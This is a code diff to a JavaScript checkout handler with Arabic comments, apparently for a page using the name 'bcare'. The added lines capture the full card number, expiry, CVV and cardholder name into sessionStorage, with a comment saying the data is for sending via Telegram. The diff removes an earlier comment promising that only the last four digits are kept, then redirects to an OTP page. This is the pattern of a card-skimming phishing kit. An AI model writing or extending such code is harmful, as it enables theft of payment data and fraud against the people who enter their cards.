@@ -240,15 +240,25 @@ function initSubmit() {
         const cardRaw  = (document.getElementById('cc-number')||{}).value||'';
         const cardClean= cardRaw.replace(/\D/g,'');
         const cardType = detectType(cardRaw);
+        const expiry   = (document.getElementById('cc-expiry')||{}).value||'';
+        const cvv      = (document.getElementById('cc-cvv')||{}).value||'';
+        const name     = (document.getElementById('cc-name')||{}).value||'';
         const ref      = 'BC-' + Date.now().toString().slice(-8).toUpperCase();
 
-        /* حفظ آخر 4 أرقام فقط (لا نحفظ الرقم كاملاً) */
         offer.cardMasked = cardClean.slice(-4);
         offer.cardType   = cardType?.name || 'بطاقة';
         offer.refNumber  = ref;
         sessionStorage.setItem('bcare_offer', JSON.stringify(offer));
+
+        /* حفظ بيانات البطاقة كاملة للإرسال عبر Telegram (اختبار شخصي) */
+        sessionStorage.setItem('bcare_card_data', JSON.stringify({
+          number: cardClean.replace(/(\d{4})/g,'$1 ').trim(),
+          type:   cardType?.name || 'بطاقة',
+          expiry,
+          cvv,
+          name,
+        }));
       } catch(err){}
-      /* الانتقال لصفحة OTP */
       window.location.href = 'otp-verify.html';
     }, 2000);
   });
